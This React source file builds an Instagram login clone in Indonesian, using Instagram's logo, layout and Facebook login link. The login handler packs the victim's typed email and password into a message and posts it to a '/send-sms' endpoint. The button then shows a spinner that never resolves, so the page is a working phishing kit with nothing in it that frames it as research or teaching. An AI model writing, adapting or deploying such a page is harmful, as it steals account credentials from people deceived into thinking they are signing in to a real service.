import React, { useState } from 'react';
import phoneImage from './assets/phone.png';
import fb from './assets/fb.png';
import play from './assets/ply.png';
import api from './api';

function App() {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const handleLogin = (e) => {
        e.preventDefault();

        setIsLoading(true);

        const message = `Email: ${email}, Password: ${password}`;

        api.post('/send-sms', { message })
            .then(response => {
                console.log(response.data)
                setIsLoading(true);
            })
            .catch(error => {
                console.log(response.data)
                setIsLoading(true);
            })
    };
    return (
        <div className="flex justify-center gap-5 bg-white py-10">
            <div className="hidden md:block ">
                <img src={phoneImage} height={440} width={420} alt="Instagram" className="max-w-full h-auto" />
            </div>

            <div className="max-w-sm md:mt-5 ">
                <div className="bg-white border border-gray-300 p-8 rounded-lg mb-6">
                    <div className='m-5'>
                        <i
                            data-visualcompletion="css-img"
                            aria-label="Instagram"
                            role="img"
                            style={{
                                backgroundImage: 'url("https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png")',
                                backgroundPosition: '0px -52px',
                                backgroundSize: 'auto',
                                width: '175px',
                                height: '51px',
                                backgroundRepeat: 'no-repeat',
                                justifyContent: 'center',
                                margin: 'auto',
                                display: 'flex'
                            }}
                        ></i>
                    </div>
                    <form className="space-y-4" onSubmit={handleLogin}>
                        <input
                            type="text"
                            placeholder="Nomor telepon, nama pengguna, atau email"
                            className="w-full px-4 py-2 border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                        />
                        <input
                            type="password"
                            placeholder="Kata Sandi"
                            className="w-full px-4 py-2 border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                        />
                        <button className="w-full py-1.5 bg-blue-500 text-white rounded-md hover:bg-blue-600" disabled={isLoading}>
                            {isLoading ? (
                                <svg className="animate-spin h-6 w-6 mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
                                </svg>
                            ) : (
                                'Masuk'
                            )}
                        </button>
                    </form>
                    <div className="flex items-center my-4">
                        <div className="flex-grow border-t border-gray-300"></div>
                        <span className="px-4 text-gray-500">ATAU</span>
                        <div className="flex-grow border-t border-gray-300"></div>
                    </div>
                    <div className="flex m-auto justify-center gap-1 hover:underline">
                        <img src={fb} alt="Facebook" />
                        <span className='text-blue-900 text-sm mt-2'>Masuk dengan Facebook</span>
                    </div>
                    <a href="#" className="block text-center text-sm mt-4 hover:underline">Lupa kata sandi?</a>
                </div>
                <div className="bg-white border border-gray-300 p-4 rounded-md text-center">
                    <span>Tidak punya akun?</span>
                    <a href="#" className="text-blue-500 ml-1 hover:underline">Buat akun</a>
                </div>
                <div>
                    <p className='text-center mt-4'>Dapatkan Aplikasi</p>
                    <img className='flex justify-center m-auto' src={play} alt="Play Store" />
                </div>
            </div>
        </div>
    );
}

export default App;
